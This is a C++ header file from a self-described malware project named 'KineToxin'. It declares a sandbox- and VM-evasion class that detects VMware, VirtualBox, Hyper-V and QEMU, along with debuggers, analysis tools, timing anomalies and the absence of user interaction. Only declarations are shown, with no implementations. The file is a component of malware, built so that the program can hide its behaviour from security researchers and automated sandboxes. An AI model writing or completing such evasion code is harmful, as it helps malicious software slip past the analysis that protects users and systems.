#ifndef KINETOXIN_VM_DETECTION_H
#define KINETOXIN_VM_DETECTION_H

#include <windows.h>
#include <string>
#include <vector>

namespace KineToxin {
namespace Evasion {

/**
 * @brief Virtual Machine and Sandbox Detection
 * 
 * This class implements various techniques to detect if the malware
 * is running in a virtual machine, sandbox, or analysis environment.
 */
class VMDetection {
public:
    /**
     * @brief Check if running in a virtual machine
     * @return TRUE if VM detected, FALSE otherwise
     */
    static BOOL IsVirtualMachine();
    
    /**
     * @brief Check if running in a sandbox environment
     * @return TRUE if sandbox detected, FALSE otherwise
     */
    static BOOL IsSandboxEnvironment();
    
    /**
     * @brief Check if debugging tools are present
     * @return TRUE if debugging detected, FALSE otherwise
     */
    static BOOL IsDebuggingDetected();
    
    /**
     * @brief Comprehensive analysis environment detection
     * @return TRUE if analysis environment detected, FALSE otherwise
     */
    static BOOL IsAnalysisEnvironment();

private:
    /**
     * @brief Check for VMware artifacts
     * @return TRUE if VMware detected, FALSE otherwise
     */
    static BOOL CheckVMware();
    
    /**
     * @brief Check for VirtualBox artifacts
     * @return TRUE if VirtualBox detected, FALSE otherwise
     */
    static BOOL CheckVirtualBox();
    
    /**
     * @brief Check for Hyper-V artifacts
     * @return TRUE if Hyper-V detected, FALSE otherwise
     */
    static BOOL CheckHyperV();
    
    /**
     * @brief Check for QEMU artifacts
     * @return TRUE if QEMU detected, FALSE otherwise
     */
    static BOOL CheckQEMU();
    
    /**
     * @brief Check system hardware characteristics
     * @return TRUE if VM hardware detected, FALSE otherwise
     */
    static BOOL CheckHardwareArtifacts();
    
    /**
     * @brief Check for VM-specific registry entries
     * @return TRUE if VM registry entries found, FALSE otherwise
     */
    static BOOL CheckRegistryArtifacts();
    
    /**
     * @brief Check for VM-specific running processes
     * @return TRUE if VM processes detected, FALSE otherwise
     */
    static BOOL CheckProcessArtifacts();
    
    /**
     * @brief Check for VM-specific services
     * @return TRUE if VM services detected, FALSE otherwise
     */
    static BOOL CheckServiceArtifacts();
    
    /**
     * @brief Check CPU characteristics for virtualization
     * @return TRUE if virtualized CPU detected, FALSE otherwise
     */
    static BOOL CheckCPUArtifacts();
    
    /**
     * @brief Check for sandbox-specific behaviors
     * @return TRUE if sandbox detected, FALSE otherwise
     */
    static BOOL CheckSandboxBehaviors();
    
    /**
     * @brief Check for user interaction (mouse movement, etc.)
     * @return TRUE if interactive user detected, FALSE otherwise
     */
    static BOOL CheckUserInteraction();
    
    /**
     * @brief Timing-based detection (sleep acceleration)
     * @return TRUE if time acceleration detected, FALSE otherwise
     */
    static BOOL CheckTimingAnomalies();
    
    /**
     * @brief Check registry key for value
     * @param hKey Registry key handle
     * @param subKey Subkey path
     * @param valueName Value name to check
     * @param expectedValue Expected value content
     * @return TRUE if value matches expected, FALSE otherwise
     */
    static BOOL CheckRegistryValue(HKEY hKey, const std::string& subKey,
                                  const std::string& valueName,
                                  const std::string& expectedValue);
    
    /**
     * @brief Check if process is running
     * @param processName Process name to check
     * @return TRUE if process is running, FALSE otherwise
     */
    static BOOL IsProcessRunning(const std::string& processName);
    
    /**
     * @brief Check if service exists
     * @param serviceName Service name to check
     * @return TRUE if service exists, FALSE otherwise
     */
    static BOOL IsServicePresent(const std::string& serviceName);
    
    // Known VM/Sandbox artifacts
    static const std::vector<std::string> VM_PROCESSES;
    static const std::vector<std::string> VM_SERVICES;
    static const std::vector<std::string> SANDBOX_ARTIFACTS;
    static const std::vector<std::string> ANALYSIS_TOOLS;
};

} // namespace Evasion
} // namespace KineToxin

#endif // KINETOXIN_VM_DETECTION_H
